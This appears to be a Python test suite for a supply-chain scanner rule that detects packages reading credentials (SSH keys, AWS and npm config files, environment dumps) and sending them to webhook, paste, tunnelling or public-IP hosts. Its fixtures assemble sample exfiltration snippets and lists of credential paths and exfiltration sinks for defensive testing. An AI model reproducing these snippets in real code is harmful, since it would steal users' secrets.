"""ESL-004 secret-exfil: a credential source and an exfiltration sink in one file.

Every credential path and sink domain is assembled from tokens at test runtime,
so no committed file contains a literal the shipped rules match (see the repo
guard in test_esl003). Ordinary hosts are ``example.invalid``; nothing here is
ever executed or contacted.
"""

from __future__ import annotations

import json
import time
from pathlib import Path

import jsonschema
import pytest
from builders import TarItem, make_tar

import eslabon.cli as cli
from eslabon import yara_engine
from eslabon.model import Limits, Member, PackageRef, ScanContext

SCHEMA = json.loads(
    (Path(__file__).parent.parent / "schema" / "event.schema.json").read_text("utf-8")
)
NL = chr(10)
BS = chr(92)

# credential sources
SSH_KEY = "~/." + "ssh/id_" + "rsa"
AWS_CREDS = "~/." + "aws/creden" + "tials"
NPMRC = "." + "npm" + "rc"
PYPIRC = "." + "pypi" + "rc"
GIT_CREDS = "." + "git-creden" + "tials"
DOCKER_CFG = "." + "docker/config" + ".json"
KUBE_CFG = "." + "kube/con" + "fig"
JS_ENV_DUMP = "JSON." + "stringify(process" + ".env)"
PY_ENV_DUMP = "json." + "dumps(dict(os" + ".environ))"

# sinks
DISCORD = "https" + "://discord" + ".com/api/web" + "hooks/123/abc"
TELEGRAM = "https" + "://api.tele" + "gram.org/bot" + "123:abc/sendMessage"
SLACK = "https" + "://hooks.sla" + "ck.com/services/T0/B0/x"
PASTEBIN = "https" + "://paste" + "bin.com/api/api_post.php"
NGROK = "https" + "://abcd.ng" + "rok-free.app/c"
OAST = "http" + "://x1y2.oa" + "st.fun/"
PUBLIC_IP = "http" + "://" + "45.33" + ".12.7:8080/c"
NORMAL = "https" + "://example.invalid/api"


def _ctx(ecosystem: str = "npm") -> ScanContext:
    pkg = PackageRef("demo", "1.0.0", ecosystem, "")
    kind = "npm" if ecosystem == "npm" else "sdist"
    return ScanContext(rules=_RULES, limits=Limits(), pkg=pkg, archive_kind=kind)


_RULES = yara_engine.compile_rules()


def _scan(src: str, path: str = "index.js", ecosystem: str = "npm"):
    m = Member(index=1, path=path, data=src.encode("ascii"), raw_path="package/" + path)
    return yara_engine.scan_member(m, _ctx(ecosystem))


def _ids(found) -> list[str]:
    return [f.rule_id for f in found]


# ------------------------------------------------------------ must fire ----


def test_ssh_key_plus_discord_webhook_fires():
    src = NL.join(
        [
            "const fs = require('fs');",
            "const os = require('os');",
            "const k = fs.readFileSync(os.homedir() + '/" + SSH_KEY[2:] + "', 'utf8');",
            "fetch('" + DISCORD + "', {method: 'POST', body: k});",
            "",
        ]
    )
    found = _scan(src)
    assert _ids(found) == ["ESL-004"]
    f = found[0]
    assert f.line == 3  # the lowest offset of all instances: the key read
    assert f.match_count == 2
    assert f.file == "index.js"


def test_env_dump_plus_telegram_fires():
    src = NL.join(
        [
            "import json, os, urllib.parse",
            "data = " + PY_ENV_DUMP,
            "u = '" + TELEGRAM + "?text=' + urllib.parse.quote(data)",
            "",
        ]
    )
    assert _ids(_scan(src, "pkg/_init.py", "pypi")) == ["ESL-004"]


def test_env_dump_plus_public_ip_url_fires():
    src = NL.join(
        [
            "const body = " + JS_ENV_DUMP + ";",
            "require('http').request('" + PUBLIC_IP + "', {method: 'POST'}).end(body);",
            "",
        ]
    )
    found = _scan(src)
    assert _ids(found) == ["ESL-004"]
    assert found[0].match_count == 2


def test_npmrc_plus_pastebin_fires():
    src = (
        "const t = fs.readFileSync(path.join(home, '" + NPMRC + "'), 'utf8');" + NL
        + "post('" + PASTEBIN + "', t);" + NL
    )
    assert _ids(_scan(src)) == ["ESL-004"]


def test_aws_credentials_plus_ngrok_fires():
    src = (
        "with open(os.path.expanduser('" + AWS_CREDS + "')) as f:" + NL
        + "    requests" + ".post('" + NGROK + "', data=f.read())" + NL
    )
    assert _ids(_scan(src, "pkg/x.py", "pypi")) == ["ESL-004"]


@pytest.mark.parametrize(
    "cred",
    [
        SSH_KEY,
        "~/." + "ssh/id_" + "ed25519",
        "C:" + BS + "Users" + BS + "u" + BS + "." + "ssh" + BS + BS + "id_" + "ecdsa",
        AWS_CREDS,
        NPMRC,
        PYPIRC,
        GIT_CREDS,
        "~/" + DOCKER_CFG,
        "~/" + KUBE_CFG,
        JS_ENV_DUMP,
        "JSON." + "stringify( process" + ".env )",
        "JSON." + "stringify({ ...process" + ".env })",
        "JSON." + "stringify(Object." + "entries(process" + ".env))",
        "JSON." + "stringify(Object." + "assign({}, process" + ".env))",
        "json." + "dumps({**os" + ".environ})",
        "json." + "dumps( { ** os" + ".environ } )",
        "JSON." + "stringify(process" + ".env, null, 2)",
        "JSON." + "stringify({...process" + ".env, A:1})",
        "json." + "dumps({**os" + ".environ, 'x': 1})",
        "path.join(h, '." + "ssh', 'id_" + "rsa')",
        "os.path.join(home, \"." + "ssh\", \"id_" + "dsa\")",
        "Path.home() / '." + "ssh' / 'id_" + "ed25519'",
        "path.join(h, '." + "aws', 'creden" + "tials')",
        "Path.home() / \"." + "AWS\" / \"CREDEN" + "TIALS\"",
        PY_ENV_DUMP,
        "json." + "dumps(os" + ".environ.copy())",
        "str(os" + ".environ)",
    ],
)
def test_every_credential_source_fires_with_a_sink(cred):
    assert _ids(_scan("x = '" + cred + "'" + NL + "y = '" + DISCORD + "'" + NL)) == [
        "ESL-004"
    ]


@pytest.mark.parametrize(
    "sink",
    [
        DISCORD,
        "https" + "://discord" + "app.com/api/web" + "hooks/1/x",
        TELEGRAM,
        SLACK,
        PASTEBIN,
        NGROK,
        "https" + "://x.ng" + "rok.io/",
        OAST,
        "https" + "://abc.oa" + "st.me/",
        "https" + "://abc.inter" + "act.sh/",
        "https" + "://abc.burpcolla" + "borator.net/",
        "https" + "://web" + "hook.site/0000-1111",
        "https" + "://en1x.m.pipe" + "dream.net/",
        "https" + "://request" + "bin.com/r/x",
        PUBLIC_IP,
        "HTTPS" + "://DISCORD" + ".COM/API/WEB" + "HOOKS/1/x",
        "https" + "://8.8" + ".8.8/",
        "http" + "://1.1" + ".1.1",
        # leading zero: WHATWG URL and inet_aton read 010 as octal 8, public
        "http" + "://010" + ".0.0.1/",
    ],
)
def test_every_sink_fires_with_a_credential(sink):
    assert _ids(_scan("a = '" + NPMRC + "'" + NL + "b = '" + sink + "'" + NL)) == [
        "ESL-004"
    ]


def test_public_ip_among_private_ones_still_fires():
    src = (
        "x = '" + PYPIRC + "'" + NL
        + "a = 'http" + "://10.0" + ".0.5/'" + NL
        + "b = 'http" + "://169.254" + ".169.254/'" + NL
        + "c = '" + PUBLIC_IP + "'" + NL
    )
    found = _scan(src, "x.py", "pypi")
    assert _ids(found) == ["ESL-004"]
    assert found[0].match_count == 2  # the cred and the one public IP


def test_pypi_and_npm_both_scanned():
    src = "a = '" + PYPIRC + "'" + NL + "b = '" + SLACK + "'" + NL
    assert _ids(_scan(src, "demo/util.py", "pypi")) == ["ESL-004"]
    assert _ids(_scan(src, "lib/util.js", "npm")) == ["ESL-004"]


# -------------------------------------------------------- must NOT fire ----


def test_botocore_shape_silent():
    src = NL.join(
        [
            "# Reads " + AWS_CREDS + " and the instance metadata service.",
            "SHARED_CREDENTIALS_FILE = '" + AWS_CREDS + "'",
            "METADATA_ENDPOINT = 'http" + "://169.254" + ".169.254/'",
            "ECS_ENDPOINT = 'http" + "://169.254" + ".170.2'",
            "STS = 'https" + "://sts.amazonaws.com'",
            "IPV6 = 'http" + "://[fd00:ec2::254]/'",
            "",
        ]
    )
    assert _scan(src, "botocore/credentials.py", "pypi") == []


def test_google_auth_shape_silent():
    src = NL.join(
        [
            "_METADATA_IP_ROOT = 'http" + "://169.254" + ".169.254'",
            "_METADATA_ROOT = 'http" + "://metadata.google.internal/computeMetadata/v1/'",
            "# AWS external accounts may also read " + AWS_CREDS,
            "_DEFAULT_TOKEN_URI = 'https" + "://oauth2.googleapis.com/token'",
            "",
        ]
    )
    assert _scan(src, "google/auth/compute_engine/_metadata.py", "pypi") == []


def test_proxy_env_reads_silent():
    py = NL.join(
        [
            "proxy = os.environ.get('HTTPS_PROXY') or os.environ.get('https_proxy')",
            "no_proxy = os.environ.get('NO_PROXY', '')",
            "netrc = os.path.expanduser('~/.netrc')",
            "r = session.get('" + NORMAL + "', proxies={'https': proxy})",
            "",
        ]
    )
    js = NL.join(
        [
            "const proxy = process.env.HTTPS_PROXY || process.env.https_proxy;",
            "axios.get('" + NORMAL + "', { proxy: false });",
            "",
        ]
    )
    assert _scan(py, "requests/utils.py", "pypi") == []
    assert _scan(js, "lib/adapters/http.js") == []


def test_node_env_stringify_silent():
    # every webpack bundle inlines this; a real sink in the same bundle must not
    # turn it into a whole-environment dump
    src = (
        "var e={'process.env.NODE_ENV':JSON." + "stringify(process"
        + ".env.NODE_ENV)};fetch('" + NORMAL + "');var s='" + SLACK + "';"
    )
    assert _scan(src, "dist/bundle.js") == []


def test_sdk_env_copy_for_child_process_silent():
    # @anthropic-ai/claude-agent-sdk: iterate the environment to copy it for a
    # child process, a connectivity probe to a public resolver, and a secret
    # redaction regex naming a webhook host. Iteration is not serialisation.
    src = (
        "function f(){let e={};for(let[t,n]of Object." + "entries(process"
        + ".env)){if(t.startsWith(\"X_\"))continue;e[t]=n}return e}"
        + "await e.head(\"http" + "://1.1" + ".1.1\","
        + "{signal:AbortSignal.timeout(1000)});"
        + "var r=[[/x/g,\"hooks.sla" + "ck.com/<redacted>\"]];"
    )
    assert _scan(src, "sdk.mjs") == []


@pytest.mark.parametrize(
    "src",
    [
        "Object." + "entries(process" + ".env).map(String)",
        "const env = {...process" + ".env, FOO: '1'}",
        "env = {**os" + ".environ, 'FOO': '1'}",
        "path.join(h, '." + "ssh', 'known_hosts')",
        "path.join(h, '." + "aws', 'config')",
    ],
)
def test_child_env_idioms_and_other_dotfiles_silent(src):
    assert _scan(src + NL + "x = '" + DISCORD + "'" + NL) == []


def test_node_env_stringify_with_indent_silent():
    src = "JSON." + "stringify(process" + ".env.NODE_ENV, null, 2);" + NL + DISCORD + NL
    assert _scan(src, "dist/bundle.js") == []


def test_dict_environ_to_subprocess_silent():
    src = NL.join(
        [
            "env = dict(os" + ".environ)",
            "env['PIP_INDEX_URL'] = '" + NORMAL + "'",
            "subprocess.run(['notify'], env=env)",
            "WEBHOOK_HELP = 'see " + SLACK + "'",
            "",
        ]
    )
    assert _scan(src, "tool/run.py", "pypi") == []


@pytest.mark.parametrize(
    "text",
    [
        "import toast from 'react-hot-toast';",
        "toast.message('saved');",
        "toast.promise(p);",
        "toast.live = true; toast.site = 1; toast.online(); toast.fun(); toast.pro;",
        "https" + "://unpkg.com/react-hot-toast.me/x",
        "https" + "://example.invalid/coast.fun",
    ],
)
def test_toast_substring_silent(text):
    assert _scan("a = '" + NPMRC + "';" + NL + text + NL) == []


@pytest.mark.parametrize(
    "ip",
    [
        "10.0" + ".0.5",
        "127.0" + ".0.1",
        "192.168" + ".1.1",
        "172.16" + ".0.1",
        "169.254" + ".169.254",
        "0.0" + ".0.0",
        "100.64" + ".0.1",
        "192.0" + ".2.10",
        "198.51" + ".100.1",
        "203.0" + ".113.5",
        "255.255" + ".255.255",
        "999.1" + ".1.1",
    ],
)
def test_private_ip_url_silent(ip):
    src = "a = '" + NPMRC + "'" + NL + "b = 'http" + "://" + ip + ":3000/'" + NL
    assert _scan(src) == []


def test_readme_documenting_npmrc_silent():
    src = NL.join(
        [
            "# demo",
            "Put your token in `" + NPMRC + "` before publishing.",
            "See " + NORMAL + " and https" + "://docs.npmjs.com/cli/configuring-npm",
            "",
        ]
    )
    assert _scan(src, "README.md") == []


def test_sink_alone_or_credential_alone_silent():
    assert _scan("post('" + DISCORD + "');" + NL) == []
    assert _scan("read('" + SSH_KEY + "');" + NL) == []


# ------------------------------------------------------ the IP filter ----


@pytest.mark.parametrize(
    ("url", "public"),
    [
        ("http" + "://8.8" + ".8.8", True),
        ("https" + "://45.33" + ".12.7:443/x", True),
        ("http" + "://010" + ".0.0.1", True),  # octal reading is 8.0.0.1
        ("http" + "://10.0" + ".0.1", False),
        ("http" + "://08.0" + ".0.1", True),  # not octal; decimal 8.0.0.1 is global
        ("http" + "://169.254" + ".169.254", False),
        ("http" + "://256.1" + ".1.1", False),
        ("http" + "://1.2" + ".3", False),  # no full IPv4 in the match
    ],
)
def test_is_public_ipv4_url(url, public):
    assert yara_engine.is_public_ipv4_url(url.encode("ascii")) is public


class _Inst:
    def __init__(self, offset: int, data: bytes) -> None:
        self.offset = offset
        self.matched_data = data


class _Str:
    def __init__(self, identifier: str, instances: list) -> None:
        self.identifier = identifier
        self.instances = instances


class _Match:
    namespace = "esl004"

    def __init__(self, strings: list) -> None:
        self.strings = strings


def test_capped_ip_string_is_kept_unfiltered():
    # past YARA's per-string cap a public IP may be unrecorded: keep the sink
    private = _Inst(10, ("http" + "://10.0" + ".0.1").encode("ascii"))
    cred = _Str("$cred_npmrc", [_Inst(0, b"x")])
    capped = _Str("$sink_ip", [private] * yara_engine._YARA_MATCH_CAP)
    assert len(yara_engine.counted_offsets(_Match([cred, capped]))) > 1
    short = _Str("$sink_ip", [private] * 3)
    assert yara_engine.counted_offsets(_Match([cred, short])) == []


# --------------------------------------------------------- performance ----


@pytest.mark.filterwarnings("ignore:too many matches")  # .npmrc passes YARA's cap
@pytest.mark.parametrize(
    "unit",
    [
        # newline-free, dense: every hit must stay cheap
        "http" + "://1.1.1.",
        "http" + "://1.1.1.1",
        "http" + "://10.0.0.5 ",
        "." + "ssh/id_",
        "." + "ssh/id_" + "rsa",
        "process" + ".env)",
        "JSON." + "stringify(" + " " * 9,
        "json." + "dumps(dict(" + " " * 9,
        "JSON." + "stringify({" + " " * 9,
        "JSON." + "stringify(process" + ".env,",
        "JSON." + "stringify(Object.assign({}" + " " * 9,
        "json." + "dumps({" + " " * 9 + "**",
        "'." + "ssh', '",
        "'." + "ssh' / '" + "id_" + "rs",
        "." + "npm" + "rc",
        "toast.",
        "oast.",
        "discord.com/api/",
        # and with line breaks
        "http" + "://1.1.1." + NL,
        "str(" + " " * 9 + NL,
    ],
)
def test_ten_mib_adversarial_input_is_fast(unit):
    data = unit.encode("ascii")
    data = data * (10 * 2**20 // len(data))
    # a sink and a credential at the end, so every rule string is live
    tail = ("'" + NPMRC + "' '" + PUBLIC_IP + "'").encode("ascii")
    m = Member(index=0, path="dist/min.js", data=data + tail, raw_path="")
    start = time.perf_counter()
    found = yara_engine.scan_member(m, _ctx())
    elapsed = time.perf_counter() - start
    print(f"10 MiB of {unit[:20]!r}: {elapsed:.2f} s")
    assert elapsed < 6.0  # YARA timeout is 10 s
    assert _ids(found) == ["ESL-004"]


# ------------------------------------------------------------- end to end ----


def test_cli_end_to_end_npm_ssh_key_to_discord(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    pkg_json = json.dumps({"name": "demo", "version": "1.0.0"}).encode("ascii")
    index = NL.join(
        [
            "const fs = require('fs');",
            "const k = fs.readFileSync(require('os').homedir() + '/"
            + SSH_KEY[2:] + "');",
            "fetch('" + DISCORD + "', {method: 'POST', body: k});",
            "",
        ]
    ).encode("ascii")
    target = tmp_path / "demo-1.0.0.tgz"
    target.write_bytes(
        make_tar(
            [
                TarItem("package/package.json", pkg_json),
                TarItem("package/index.js", index),
            ]
        )
    )
    out = tmp_path / "out" / "e.jsonl"
    code = cli.main(["scan", str(target), "--out", str(out), "--ecosystem", "npm"])
    assert code == 1
    events = [json.loads(x) for x in out.read_text("ascii").splitlines()]
    for ev in events:
        jsonschema.validate(ev, SCHEMA)
    findings = [e for e in events if e["event"]["dataset"] == "eslabon.finding"]
    assert [e["rule"]["id"] for e in findings] == ["ESL-004"]
    assert findings[0]["eslabon"]["evidence"]["file"] == "index.js"
    assert findings[0]["eslabon"]["evidence"]["line"] == 2
